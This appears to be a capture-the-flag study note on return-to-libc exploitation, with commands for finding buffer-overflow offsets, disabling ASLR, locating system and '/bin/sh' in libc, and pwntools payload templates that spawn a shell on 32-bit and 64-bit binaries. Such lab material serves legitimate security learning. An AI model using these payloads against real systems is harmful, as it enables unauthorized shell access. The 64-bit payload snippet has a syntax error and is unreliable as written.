### Return to Lib-C


---

[one gadget](https://github.com/david942j/one_gadget)

ROP exploit - Return oriented programming, pass `/bin/sh` as input data for system call in libc to get shell.

```py
NX enabled - Shellcode method cannot be used
ASLR enabled - address space layout randomization to prevent boff attacks
```

Example - same as was used in `Shellcode`

`Dynamically linked` elf files, start returning to libc and try to get a shell

```py
32 bit ELF
cyclic 100
run <payload>
cyclic -l <value in EIP>
search -t string "/bin/sh", grab the address.
ldd <elf file> (different libc address everytime)
Disable aslr : echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
ldd <elf file> (same libc address everytime)
readelf -s <libc library>
```

![image](https://github.com/ckc9759/CTF_resources/assets/95117634/3e26593c-9e8f-47ff-8236-86091f1d3793)

Offset from the base of libc to system : `00045040`

![image](https://github.com/ckc9759/CTF_resources/assets/95117634/4e23a720-a72d-4615-a088-3f8ee15d33db)

![image](https://github.com/ckc9759/CTF_resources/assets/95117634/d67bc19e-4a73-43a4-9ce8-af17c67e1ad9)

```py
payload=flat(
   asm('nop')*padding, # padding up to EIP
   system, # Address of system function in libc
   0x0, # Return pointer
   binsh # Address of /bin/sh in libc
)
```

---

#### 64 bit ELF

```py
ropper --file <filename> --search "pop rdi"

payload=flat(
   asm('nop')*padding, # padding up to RIP
   pop_rdi, # pop the address into the RDI register
   binsh # Address of /bin/sh in libc
   system, # Address of system function in libc
)
```

---

#### Example

```py
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
ldd vulm-32 -> grab the libc.so.* address
readelf -s /lib32/libc.so.6 | grep system -> address of system
